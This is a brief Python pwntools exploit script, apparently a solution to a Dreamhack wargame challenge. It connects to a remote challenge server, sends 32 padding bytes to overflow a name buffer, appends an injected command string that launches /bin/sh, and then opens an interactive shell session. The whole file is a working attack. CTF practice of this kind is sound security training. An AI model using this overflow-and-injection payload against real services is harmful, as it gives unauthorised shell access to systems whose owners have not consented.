from pwn import *

connection = remote('host1.dreamhack.games' , 10727) 

name_buf = b'A'*32
attack = b'ifconfig & "/bin/sh" '
pload = name_buf+attack
print(pload)
connection.sendline(pload) 



connection.interactive()
